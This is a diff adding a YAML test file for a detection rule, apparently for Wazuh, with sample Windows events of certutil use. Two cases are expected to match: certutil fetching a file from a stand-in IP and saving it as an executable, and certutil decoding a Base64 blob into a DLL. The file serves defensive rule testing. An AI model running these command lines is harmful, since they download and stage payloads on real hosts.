@@ -1,0 +1,29 @@
+rule_id: 208404a0-90ff-45dc-b574-431caec36bfb
+cases:
+  - name: certutil downloading a payload
+    expect: match
+    # Stock Wazuh rule 92075 (level 12, "CertUtil.exe launched with commands to create a
+    # binary file") is evaluated before the generated rule and reports this event.
+    wazuh_shadowed_by: [92075]
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      OriginalFileName: 'CertUtil.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://203.0.113.50/a.txt C:\Users\Public\a.exe'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'OPENSOC\jdoe'
+  - name: certutil decoding a Base64 blob
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      OriginalFileName: 'CertUtil.exe'
+      CommandLine: 'certutil /decode C:\Users\Public\enc.txt C:\Users\Public\payload.dll'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'OPENSOC\jdoe'
+  - name: certutil dumping the local certificate store
+    expect: no_match
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      OriginalFileName: 'CertUtil.exe'
+      CommandLine: 'certutil -store My'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'OPENSOC\pki_admin'
